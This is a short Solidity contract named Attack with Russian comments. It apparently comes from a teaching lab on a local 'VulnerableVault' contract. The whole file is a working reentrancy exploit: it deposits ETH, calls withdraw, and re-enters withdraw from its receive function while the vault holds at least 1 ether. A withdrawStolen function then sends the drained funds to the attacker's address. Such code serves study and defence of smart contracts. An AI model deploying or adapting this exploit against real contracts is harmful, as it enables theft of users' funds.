// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./VulnerableVault.sol";

contract Attack {
    VulnerableVault public vault;
    address public owner;

    constructor(address vaultAddress) {
        vault = VulnerableVault(vaultAddress);
        owner = msg.sender;
    }

    // кладём деньги и запускаем withdraw
    function attack() external payable {
        require(msg.value > 0, "Need ETH");
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    // когда vault отправляет нам ETH — мы снова вызываем withdraw
    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw();
        }
    }

    function withdrawStolen() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}
